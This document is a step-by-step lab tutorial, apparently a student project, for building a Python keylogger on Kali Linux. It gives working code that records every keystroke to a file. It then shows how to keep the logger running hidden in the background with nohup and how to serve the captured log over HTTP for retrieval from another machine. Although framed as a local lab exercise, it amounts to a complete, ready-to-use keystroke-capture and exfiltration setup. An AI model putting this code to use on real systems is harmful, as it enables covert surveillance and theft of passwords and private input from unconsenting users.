Project Title: Key logger using Python on Kali Linux

Project Goal
To build and run a Python-based keylogger on Kali Linux inside a VMware environment, log all keystrokes, and export the data via HTTP server.
Step-1 Open VMware Workstation, start Kali Linux, and update the system (optional but recommended for best performance and security).
Comment - (sudo apt update && sudo apt upgrade -y)
sudo – Runs the command as a superuser (with admin rights).
apt – The package manager used in Kali Linux and other Debian-based systems.
update – Refreshes the list of available packages and their versions from the internet.
&& – Runs the next command only if the previous one is successful.
upgrade – Installs the latest versions of the packages already on your system.
-y – Automatically says "yes" to all prompts during the upgrade.

STEP 2 Install the pynput library, which is used to monitor and record keystrokes in Python.
Install pynput - (pip3 install pynput)
pynput is a Python library used to control and monitor input devices like the keyboard and mouse. It's commonly used in projects like keyloggers, automation scripts, or accessibility tools.

To check if pynput is installed on your Kali Linux system.
open the terminal and type (python3) to enter the Python shell. 
Once inside, type (import pynput). If no error appears, it means the library is already installed.
You can then exit the Python shell by typing (exit()).

However, if you see an error saying that the module is not found, it means pynput is not installed. 

In that case, install the library by running the command (pip3 install pynput) in the terminal. 
If you receive a "command not found" error for pip3, it means pip is not installed on your system. 
To fix this, install pip by running (sudo apt install python3-pip -y).

pip stands for "Pip Installs Packages",  Python 3 (most common in Kali)

To check if pip3 is installed on your system.
Run the command (pip3 --version) in the terminal. If pip is installed, it will display the installed version.
However, if pip is not installed, you will see an error message saying: "Command 'pip3' not found".
In that case, you can install it by running the command - (sudo apt install python3-pip -y).
Pip - It is the package manager for Python that allows you to install libraries from the internet, uninstall ones you no longer need, upgrade existing libraries to their latest versions, and handle dependencies automatically, making Python development easier and more organized.

Step-3 Open your Kali Linux home directory, create a file called keylogger.py using the Nano editor, and paste the code inside.

from pynput import keyboard

def on_press(key):
    try:
        with open("keylog.txt", "a") as f:
            f.write(f"{key.char}\n")
    except AttributeError:
        with open("keylog.txt", "a") as f:
            f.write(f"{key}\n")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

Press Ctrl + O → Enter (to save)
Press Ctrl + X (to exit)

Step-4 Run the script in the terminal using the command. It will now log all keystrokes to keylog.txt in the same folder.
Commant - (python3 keylogger.py)

Step-5 Open another terminal or any application and type some text for example, in a text editor or directly in the terminal. Once you've typed some input, go back to the terminal where you initially ran the script. To stop the script, press Ctrl + C.

Check the log file: (cat keylog.txt) You’ll see the logged keystrokes.

Step-6 To run the script without keeping the terminal open, use the following command
Commant - (nohup python3 keylogger.py &)
nohup → keeps the program running even if you close the terminal. (Stands for no hangup).
python3 keylogger.py → runs your script with Python 3.
& → runs it in the background so you can still use the terminal.
This will keep the script running in the background, even after the terminal is closed.

Step-7 File Transfer Using Python HTTP Server
What is Python HTTP Server?
Python has a built-in feature that allows you to turn any folder into a web server. That means you can,Share files from that folder over the network and Download them using a web browser from another device. This method is useful when you want to download files (like your keylogger log file) from your Kali Linux VM to another device (like your Windows host machine) without USB or SSH.

If you are working in a local lab environment, you can share the file via HTTP.

Command-(python3 -m http.server 8080). 
python3 → runs Python version 3.
-m http.server → tells Python to start a small built-in web server.
8080 → the port number where the server will run (you can change it).

“Start a simple web server on port 8080 using Python.”
You can then open your browser and go to another device on the network -> Open browser -> Go to: http://<kali_ip>:8080/keylog.txt

(You can get your Kali IP using ifconfig or ip a)

Step-8 To find running process:
Use this comment (ps aux | grep keylogger.py)
ps aux “Please list all the programs that are currently running on the computer.”
ps = process status
a = show processes for all users
u = show the user who started the process and extra details
x = include programs not started from a terminal
This alone will give you a big list of everything running.
| (pipe symbol)
The | takes the output from the first command (ps aux) and sends it directly into another command.
Think of it like a conveyor belt: whatever comes out of the first machine goes into the second machine.
grep keylogger.py
grep is a search tool.
Here, it’s searching for the text keylogger.py in the big list of programs.
It will only show the lines that match this text.
Look for something like: kali     94403  ... python3 keylogger.py
To stop this running process comment - (kill 94403) (Replace 94403 with whatever PID your system shows).
